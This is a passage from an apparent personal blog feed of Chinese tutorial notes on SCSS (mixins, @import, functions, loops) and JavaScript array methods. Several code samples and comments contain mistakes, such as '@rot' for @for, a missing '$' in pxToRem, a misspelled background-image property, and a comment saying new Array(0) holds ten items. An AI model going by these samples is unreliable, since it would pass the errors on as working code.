class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$success-color</span>: <span class="number">#dff0d8</span>;</span><br><span class="line"><span class="selector-class">.success-bg</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="variable">$success-color</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.success-panel</span>&#123;</span><br><span class="line">    <span class="selector-class">.panel-heading</span>&#123;</span><br><span class="line">        <span class="attribute">background</span>: <span class="variable">$success-color</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.panel-body</span>&#123;</span><br><span class="line">        <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="variable">$success-color</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="三、文件级的复用——模块系统"><a href="#三、文件级的复用——模块系统" class="headerlink" title="三、文件级的复用——模块系统"></a>三、文件级的复用——模块系统</h3><blockquote><p>模块化是软件工程的第一要务，是大型项目的必需建筑。软件工程的主要目标就是控制复杂度，这也正是模块化的目的。通过将一个大型复杂的工程拆解成一个个的小模块，使得校验、调试、测试都轻而易举。<br>CSS原生的 <code>@import</code> 提供了一个并没有卵用的假模块系统。Sass 对 <code>@import</code> 进行了拓展，实现了一个真正意义上甚至功能更强大的模块系统。Sass 选择对 <code>@import</code> 进行扩展，而不是新建一个指令，可见 import 这个关键字的语义之强，JavaScript 模块系统的关键字也是 <code>import</code>。<br><strong>css原生写法</strong><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- index.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/your/site/common.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/your/site/popup.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/your/site/module_a.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/your/site/site.css"</span>&gt;</span></span><br></pre></td></tr></table></figure></p></blockquote><p><strong>scss写法</strong><br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* site.scss */</span></span><br><span class="line">@<span class="keyword">import</span> <span class="string">"common"</span>;</span><br><span class="line">@<span class="keyword">import</span> <span class="string">"popup"</span>;</span><br><span class="line">@<span class="keyword">import</span> <span class="string">"module_a"</span>;</span><br></pre></td></tr></table></figure></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- index.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/your/site/site.css"</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="四、展示层的复用——混合指令"><a href="#四、展示层的复用——混合指令" class="headerlink" title="四、展示层的复用——混合指令"></a>四、展示层的复用——混合指令</h3><blockquote><p>混合(mixin)特别类似于 JavaScript 中的函数，然而 Sass 提供了用于表达式计算的 @function 函数指令，这里就不好这么类比了。但其实就是这么个东西，调用的时候会返回一段样式。<br>Mixin是SASS中非常强大的特性之一。定义mixin时，需要在前面加@mixin，使用时需要添加@include来引用该mixin。<br><strong>比如下面一段存在重复样式的代码。</strong><br><em>复用之前</em><br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.description</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e3e3e3</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">2px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.article</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#444</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e3e3e3</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">2px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><p><em>稍作优化</em><br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.description</span>, <span class="selector-class">.article</span>&#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e3e3e3</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">2px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.description</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.article</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#444</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><em>似乎不错，但是之后再新加类似样式时，</em><br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.description</span>, <span class="selector-class">.article</span>, <span class="selector-class">.style01</span>, <span class="selector-class">.style02</span>&#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e3e3e3</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">2px</span>;</span><br><span class="line">&#125;</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line"><span class="selector-class">.style01</span>&#123;&#125;</span><br><span class="line"><span class="selector-class">.style02</span>&#123;&#125;</span><br></pre></td></tr></table></figure></p><p>每次都要改两个地方，很麻烦，很容易漏，尤其是将通用样式分离出来的话更容易出错。<br><em>再做优化：</em><br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.grey-border-radius</span>&#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e3e3e3</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">2px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.description</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.article</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#444</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>似乎好了一点，但这样的话，html 每个使用的标签都需要多加上一个 <code>.grey-border-radius</code> 类。很显然这是多余的。这种做法可以说是“凑合”。<br><em>使用 Sass 复用之后：</em><br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">mixin</span> grey-border-radius&#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e3e3e3</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">2px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.description</span>&#123;</span><br><span class="line">    @<span class="keyword">include</span> grey-border-radius;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.article</span>&#123;</span><br><span class="line">    @<span class="keyword">include</span> grey-border-radius;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#444</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><em>编译后的 css 输出：</em><br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.description</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e3e3e3</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">2px</span>;</span><br><span class="line">  <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.article</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e3e3e3</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">2px</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#444</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>继承<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">include</span> aa</span><br><span class="line">@<span class="keyword">extend</span> aa</span><br><span class="line"></span><br><span class="line">@function</span><br><span class="line"></span><br><span class="line"><span class="variable">$baseFontSize</span>: 10px !default;</span><br><span class="line"><span class="variable">$gray</span>: <span class="number">#ccc</span> !default;</span><br><span class="line"></span><br><span class="line">@function pxToRem(<span class="variable">$px</span>) &#123;</span><br><span class="line">    @return <span class="variable">$px</span> / baseFontSize * 1rem;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>:<span class="variable">$baseFontSize</span>;</span><br><span class="line">    <span class="attribute">color</span>:lighten(<span class="variable">$gray</span>,<span class="number">10%</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.text</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>:pxToRem(<span class="number">16px</span>);</span><br><span class="line">    <span class="attribute">color</span>:darken(<span class="variable">$gray</span>,<span class="number">10%</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$ite7</span>: true;</span><br><span class="line"><span class="variable">$type</span>: m0onster;</span><br><span class="line"><span class="selector-class">.ib</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>:inline-block;</span><br><span class="line">    @<span class="keyword">if</span> <span class="variable">$ite7</span> &#123;</span><br><span class="line">        *<span class="attribute">display</span>:inline;</span><br><span class="line">        *zoom:<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span>&#123;</span><br><span class="line">    @<span class="keyword">if</span> <span class="variable">$type</span> == ocean &#123;</span><br><span class="line">        <span class="attribute">color</span>: blue;</span><br><span class="line">    &#125; @<span class="keyword">else</span> if <span class="variable">$type</span> == matador &#123;</span><br><span class="line">        <span class="attribute">color</span>:red;</span><br><span class="line">    &#125; @<span class="keyword">else</span> if <span class="variable">$type</span> == monster &#123;</span><br><span class="line">        <span class="attribute">color</span>: green;</span><br><span class="line">    &#125; @<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="attribute">color</span>: black;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>三目判断<br>语法： if($condition, $if_true, $if_false)<br>三个参数分别表示：条件，条件为真的值，条件为假的值</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(true, 1px, 2px)  =&gt; 1px </span><br><span class="line">if(false, 1px, 2px) =&gt; 2px</span><br></pre></td></tr></table></figure><p>for 循环<br>for循环有两种形式，分别为：@rot $var from <start> through <end> 和 @for $var from <start> to <end> 。$i表示变量，start表示起始值，end表示结束值，这两个的区别是关键字through表示包括end这个数，而to则不包括end这个数。<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">for</span> <span class="variable">$i</span> from 1 through 3&#123;</span><br><span class="line">    <span class="selector-class">.item-</span>#&#123;<span class="variable">$i</span>&#125; &#123; <span class="attribute">width</span>: <span class="number">2em</span> * <span class="variable">$i</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line">========css</span><br><span class="line"><span class="selector-class">.item-1</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">2em</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.item-2</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">4em</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.item-3</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">6em</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">for</span> <span class="variable">$i</span> from 1 to 3 &#123;</span><br><span class="line">    <span class="selector-class">.item-</span>#&#123;<span class="variable">$i</span>&#125; &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">2em</span> * <span class="variable">$i</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">=========css</span><br><span class="line"><span class="selector-class">.item-1</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">2em</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.item-2</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">4em</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></end></start></end></start></p><p>@each循环<br>语法为：@each $var in <list or map>。其中$var表示变量，而list和map表示list的类型数据和map的类型数据。</list></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$animal-list</span>: puma, sea-slug, egret, salamander;</span><br><span class="line">@<span class="keyword">each</span> <span class="variable">$animal</span> in $ <span class="variable">$animal-list</span> &#123;</span><br><span class="line">    .#&#123;<span class="variable">$animal</span>&#125;-<span class="attribute">icon</span> &#123;</span><br><span class="line">        <span class="attribute">background-image</span>: url(<span class="string">'/images/#&#123;$animal&#125;.png'</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.puma-icon</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: url(<span class="string">'/images/puma.png'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.sea-slug-icon</span> &#123;</span><br><span class="line">    bnackground-image: url(<span class="string">'/images/sea-slug.png'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SCSS 是 Sass 3 引入的新语法，语法上完全兼容原生 CSS，功能上完全继承 Sass，可以说是 CSS 和 Sass 的完美融合。SCSS 之于 Sass 犹如 CSS3 之于 CSS，ES6 之于 JS。所以别纠结，其实是一个东西啦。&lt;br&gt;
    
    </summary>
    
    
      <category term="CSS" scheme="https://jiuylq.github.io/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>Array笔记</title>
    <link href="https://jiuylq.github.io/2018/09/07/Array/"/>
    <id>https://jiuylq.github.io/2018/09/07/Array/</id>
    <published>2018-09-07T07:51:28.000Z</published>
    <updated>2019-04-07T05:17:16.587Z</updated>
    
    <content type="html"><![CDATA[<p>本文总结了一些js数组的常用方法<br><a id="more"></a></p><the rest of contents | 余下全文><h2 id="Array笔记"><a href="#Array笔记" class="headerlink" title="Array笔记"></a>Array笔记</h2><p><img src="images/Array.png" alt="简介" title="简介"></p><h3 id="1、创建数组的方法"><a href="#1、创建数组的方法" class="headerlink" title="1、创建数组的方法"></a>1、创建数组的方法</h3><blockquote><p>属性  </p></blockquote><p><strong>length</strong><br>　　length属性表示数组的长度，即其中元素的个数。<br>JavaScript数组的length属性是可变的，当length属性被设置得更大时，整个数组的状态事实上不会发生变化，仅仅是length属性变大；当length属性被设置得比原来小时，则原先数组中索引大于或等于length的元素的值全部被丢失。  </p><p><strong>prototype</strong><br>　　返回对象类型原型的引用。prototype 属性是 object 共有的。<br>一般用来给数组实例添加方法。  </p><p><strong>constructor</strong><br>　　表示创建对象的函数。<br>　　说明：constructor 属性是所有具有 prototype 的对象的成员。constructor 属性保存了对构造特定对象实例的函数的引用。</p><h3 id="1-1-使用Array构造函数"><a href="#1-1-使用Array构造函数" class="headerlink" title="1.1 使用Array构造函数:"></a>1.1 使用Array构造函数:</h3><pre><code class="javascript"><span class="keyword">var</span> arr1 = <span class="keyword">new</span> <span class="built_in">Array</span>(); <span class="comment">//创建一个空数组</span><span class="keyword">var</span> arr2 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0</span>); <span class="comment">//创建一个包含10个项的数组</span><span class="keyword">var</span> arr3 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">"lily"</span>,<span class="string">"lucy"</span>,<span class="string">"Tom"</span>); <span class="comment">//创建一个包含3个字符串的数组</span></code></pre><h3 id="1-2-使用数组字面量："><a href="#1-2-使用数组字面量：" class="headerlink" title="1.2 使用数组字面量："></a>1.2 使用数组字面量：</h3><pre><code class="javascript"><span class="keyword">var</span> arr4 = []; <span class="comment">//创建一个空数组</span><span class="keyword">var</span> arr5 = [<span class="number">10</span>]; <span class="comment">//创建一个包含包含10的数组</span><span class="keyword">var</span> arr6 = [<span class="string">"lily"</span>,<span class="string">"lucy"</span>,<span class="string">"Tom"</span>]; <span class="comment">//创建一个包3个字符串的数组</span></code></pre><h3 id="1-3-使用Array-of-创建数组"><a href="#1-3-使用Array-of-创建数组" class="headerlink" title="1.3 使用Array.of()创建数组"></a>1.3 使用Array.of()创建数组</h3><pre><code class="javascript"><span class="keyword">var</span> arr = <span class="built_in">Array</span>.of(<span class="number">7</span>);       <span class="comment">// 创建数组并赋值 [7] </span><span class="keyword">var</span> arr = <span class="built_in">Array</span>.of(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>); <span class="comment">// 创建数组并赋值 [1, 2, 3]</span></code></pre><h2 id="2-检测数组"><a href="#2-检测数组" class="headerlink" title="2 检测数组"></a>2 检测数组</h2><pre><code class="javascript"><span class="comment">//判断一个对象是否时数组</span><span class="keyword">var</span> arr = [];<span class="keyword">if</span>(arr <span class="keyword">instanceof</span> <span class="built_in">Array</span>){} <span class="comment">//方法一</span><span class="keyword">if</span>(<span class="built_in">Object</span>.prototype.toString.call(arr) == <span class="string">'[object Array]'</span>){} <span class="comment">//方法二</span><span class="keyword">if</span>(<span class="built_in">Array</span>.isArray(arr)){} <span class="comment">//方法四</span><span class="keyword">if</span>(arr.constructor == <span class="built_in">Array</span>){} <span class="comment">//方法四</span></code></pre><h2 id="3-数组方法-isArray-from-of"><a href="#3-数组方法-isArray-from-of" class="headerlink" title="3 数组方法  isArray, from, of"></a>3 数组方法 <font size="3"> isArray, from, of</font></h2><p><strong>Array.isArray(obj)</strong><br>　　检测对象是否是A容榕阿姨，是则返回true,否则返回false。  </p><p><strong>Array.from(arrayLike,mapFn,thisArg)</strong><br>　　该方法从一个类数组或可迭代对象创建一个新的数组实例。参数arrayLike是想要转换成真实数组的类数组对象或可遍历对象。mapFn是可选参数，如果指定了该参数，则最后生成的数组会经过该函数的加工处理后再返回。thisArg时可选参数，为执行mapFn函数时this的值。<br>　　所谓类似数组的对象，本质特征只有一点，即必须有length属性。因此，任何有length属性的对象，都可以通过Array.from方法转换为数组。<br>　　实际应用中，常见的类似数组的对象是 DOM 操作返回的 NodeList 集合，以及函数内部的 arguments 对象。  </p><pre><code class="javascript"><span class="keyword">let</span> arrayLike = {    <span class="number">0</span>:<span class="string">'a'</span>,    <span class="number">1</span>:<span class="string">'b'</span>,    <span class="number">2</span>:<span class="string">'c'</span>,    length:<span class="number">3</span>};<span class="keyword">let</span> arrayLike2 = {<span class="attr">length</span>:<span class="number">3</span>};<span class="keyword">let</span> str = <span class="string">'abc'</span>;<span class="keyword">let</span> newArray = <span class="built_in">Array</span>.from(arrayLike) <span class="comment">//['a','b','c']</span><span class="keyword">let</span> newArray2 = <span class="built_in">Array</span>.from(arrayLike, (v) =&gt; v+<span class="string">'1'</span>) <span class="comment">//['a1','b1','c1']</span><span class="keyword">let</span> newArray3 = <span class="built_in">Array</span>.from(arrayLike2) <span class="comment">//[undefined,undefined,undefined]</span><span class="keyword">let</span> newArray4 = <span class="built_in">Array</span>.from(str) <span class="comment">//['a','b','c']</span></code></pre><p><strong>Array.of(item…)</strong><br>　　该方法用于创建数组实例。该方法用于代替Array()或new Array().Array.or()和Array构造函数之间的区别在于处理整数参数：Array.of(6)创建一个具有单个元素6的数组，而Array(6)则创建一个包含6个undefined元素的数组。  </p><pre><code class="javascript"><span class="built_in">Array</span>.of(<span class="number">7</span>);       <span class="comment">// [7] </span><span class="built_in">Array</span>.of(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>); <span class="comment">// [1, 2, 3]</span><span class="built_in">Array</span>(<span class="number">7</span>);          <span class="comment">// [ , , , , , , ]</span><span class="built_in">Array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);    <span class="comment">// [1, 2, 3]</span></code></pre><h3 id="数组实例"><a href="#数组实例" class="headerlink" title="数组实例　　"></a>数组实例　　</h3><p>　　所有数组实例都会从Array.prototype继承属性和方法。修改Array的原型会影响到所有的数组实例。  </p><blockquote><p>属性</p></blockquote><p><strong>Array.prototype.constructor</strong><br>　　所有的数组实例都继承了这个属性，它的值就是 Array，表明了所有的数组都是由 Array 构造出来的。  </p><p><strong>Array.prototype.length</strong><br>　　上面说了，因为 Array.prototype 也是个数组，所以它也有 length 属性，这个值为 0，因为它是个空数组。  </p><blockquote><p>方法</p></blockquote><p><strong>修改器方法</strong><br>下面的这些方法会改变调用它们的对象自身的值：  </p><p><strong>push()</strong><br>push()方法将一个或多个元素添加到数组的末尾，并返回新数组的长度  </p><blockquote><p>语法<br>arr.push(element1, …, elementN)<br>返回值：返回新的数组的长度。</p></blockquote><blockquote><p><em>添加元素到数组</em><br><code>`</code>javascript<br>var sports = [“soccer”, “baseball”];<br>var total = sports.push(“football”, “swimming”);</p></blockquote><p>console.log(sports);<br>// [“soccer”, “baseball”, “football”, “swimming”]</p><p>console.log(total);  // 4</p><pre><code>&gt;*合并两个数组*  使用 apply() 添加第二个数组的所有元素  ```javascriptvar vegetables = [&apos;parsnip&apos;, &apos;potato&apos;];var moreVegs = [&apos;celery&apos;, &apos;beetroot&apos;];// 将第二个数组融合进第一个数组// 相当于 vegetables.push(&apos;celery&apos;, &apos;beetroot&apos;);Array.prototype.push.apply(vegetables, moreVegs);console.log(vegetables); // [&apos;parsnip&apos;, &apos;potato&apos;, &apos;celery&apos;, &apos;beetroot&apos;]</code></pre><p><strong>pop()</strong>  </p><p>pop()方法从数组中删除最后一个元素，并返回该元素的值。吃方法更改数组的长度。  </p><blockquote><p>语法<br>arr.pop()<br>返回值：从数组中删除的元素(当数组为空时返回undefined)。</p></blockquote><pre><code class="javascript"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];arr.length; <span class="comment">// 3</span>arr.pop(); <span class="comment">// 3</span><span class="built_in">console</span>.log(arr); <span class="comment">// [1, 2]</span>arr.length; <span class="comment">// 2</span></code></pre><p><strong>unshift()</strong>  </p><p>unshift()方法将一个或多个元素添加到数组的开头，并返回新数组的长度。  </p><blockquote><p>语法<br>arr.unshift(element1, …, elementN)<br>返回值：返回新数组的长度</p></blockquote><pre><code class="javascript"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];arr.unshift(<span class="number">4</span>,<span class="number">5</span>);<span class="built_in">console</span>.log(arr) <span class="comment">//[4,5,1,2,3]</span></code></pre><p><strong>shift()</strong>  </p><p>shift()方法从数组中删除第一个元素，并返回该元素的值。此方法更改数组的长度。  </p><blockquote><p>语法<br>arr.shift()<br>返回值：从数组中删除的元素；(当数组为空时返回undefined)</p></blockquote><pre><code class="javascript"><span class="keyword">let</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];<span class="keyword">let</span> arr2 = arr1.shift();<span class="built_in">console</span>.log(arr1); <span class="comment">//[2,3]</span><span class="built_in">console</span>.log(arr2); <span class="comment">//1</span></code></pre><p><strong>splice()</strong>  </p><p>splice()方法通过删除现有的元素或添加新元素来更改一个数组的内容（在任意的位置给数组添加或删除任意个元素）。  </p><blockquote><p>语法<br>array.splice(start[, deleteCount[, item1[, item2[, …]]]])  </p></blockquote><blockquote><p>参数<br><em>start</em><br>　　指定修改的开始位置（从0计数）。如果超出了数组的长度，则从数组末尾开始添加内容；如果是负值，则表示从数组末位开始的第几位（从-1计数）；若只使用start参数而不使用deleteCount、item，如：array.splice(start) ，表示删除[start，end]的元素。<br><em>deleteCount 可选</em><br>　　整数，表示要移除的数组元素的个数。如果 deleteCount 是 0，则不移除元素。这种情况下，至少应添加一个新元素。如果 deleteCount 大于start 之后的元素的总数，则从 start 后面的元素都将被删除（含第 start 位）。<br>如果deleteCount被省略，则其相当于(arr.length - start)。<br><em>item1, item2, … 可选</em><br>　　要添加进数组的元素,从start 位置开始。如果不指定，则 splice() 将只删除数组元素。<br>splice方法使用deleteCount参数来控制是删除还是添加：<br>start参数是必须的，表示开始的位置（从0计数），如：start=0从第一个开始；start&gt;= array.length-1表示从最后一个开始。<br>①、从start位置开始删除[start，end]的元素。<br>array.splice(start)<br>②、从start位置开始删除[start，Count]的元素。<br>array.splice(start, deleteCount)<br>③、从start位置开始添加item1, item2, …元素。<br>array.splice(start, 0, item1, item2, …)   </p></blockquote><pre><code class="javascript"><span class="keyword">var</span> months = [<span class="string">'Jan'</span>, <span class="string">'March'</span>, <span class="string">'April'</span>, <span class="string">'June'</span>];months.splice(<span class="number">1</span>, <span class="number">0</span>, <span class="string">'Feb'</span>);<span class="comment">// inserts at 1st index position</span><span class="built_in">console</span>.log(months);<span class="comment">// expected output: Array ['Jan', 'Feb', 'March', 'April', 'June']</span>months.splice(<span class="number">4</span>, <span class="number">1</span>, <span class="string">'May'</span>);<span class="comment">// replaces 1 element at 4th index</span><span class="built_in">console</span>.log(months);<span class="comment">// expected output: Array ['Jan', 'Feb', 'March', 'April', 'May']</span></code></pre><p><strong>sort()</strong><br>sort() 方法对数组的元素进行排序，并返回数组。 sort 排序不一定是稳定的。默认排序顺序是根据字符串Unicode码点。  </p><blockquote><p>语法<br>arr.sort()<br>arr.sort(compareFunction)<br><em>compareFunction</em><br>　　